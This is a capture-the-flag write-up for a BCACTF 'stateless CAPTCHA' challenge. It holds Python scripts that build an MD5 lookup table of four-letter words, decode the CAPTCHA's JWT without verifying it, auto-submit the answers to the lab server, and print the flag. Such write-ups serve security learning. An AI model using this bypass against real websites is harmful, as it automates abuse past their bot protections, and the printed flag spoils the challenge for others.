---
ai_date: '2025-04-27 05:12:51'
ai_summary: Bypassed MD5 CAPTCHA by generating a hash table and solving the challenge
  with precomputed word matches.
ai_tags:
- md5
- hash-table
- captcha-bypass
created: 2024-06-09T18:06
updated: 2024-06-10T23:17
---

> Can you bypass this website's new stateless CAPTCHA system?

---

Seems to be a MD5 captcha system.

## First we will generate the entire hash table for 4 letter words.

```python
import hashlib  
import pickle  
  
md5_hash_table = {}  
for i in range(26 ** 4):  
    perm = ''  
    for j in range(4):  
        perm += chr(65 + (i // (26 ** j)) % 26)  
    md5_hash_table[hashlib.md5(perm.encode('utf-8')).hexdigest()] = perm  
  
with open("hash_table.pkl", "wb") as f:  
    pickle.dump(md5_hash_table, f)
```

## Then, we will solve the captcha, and get the flag.

```python
import pickle  
from tqdm import tqdm  
import jwt  
import requests  
  
with open("hash_table.pkl", "rb") as f:  
    loaded_hash_table = pickle.load(f)  
  
url = "http://challs.bcactf.com:30477/captcha"  
data = requests.post(url, json={"routeId": "/flag"}).json()  
for i in tqdm(range(data['total'])):  
    captchaToken, solved, total, done = data['captchaToken'], data['solved'], data['total'], data['done']  
    decoded = jwt.decode(captchaToken, algorithms=["HS256"], options={"verify_signature": False})  
    h = decoded['challengeId']  
    d = loaded_hash_table[h]  
    data = requests.post(url, json={"captchaToken": captchaToken, "word": d}).json()  
print(f"http://challs.bcactf.com:30477/flag?token={data['captchaToken']}")
```

Simple.

```
http://challs.bcactf.com:30477/flag?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjYXB0Y2hhSWQiOiJkOWE5ZThiNi1hODUwLTQ5NDQtYTEwNC0wMmJiYTYyNDJhMTMiLCJyb3V0ZUlkIjoiL2ZsYWciLCJjaGFsbGVuZ2VJZCI6bnVsbCwic29sdmVkIjo3NSwidG90YWwiOjc1LCJkb25lIjp0cnVlLCJpYXQiOjE3MTc5NzMwMzQsImV4cCI6MTcxNzk3MzA5NH0._XcYLLZL_YJ8GpngWfDsp_fAz-G_92NSXUEwoTIdhC4
```

> # The Flag
> bcactf{b33p_B0oP_iM_a_B0t_1b728b571b9a}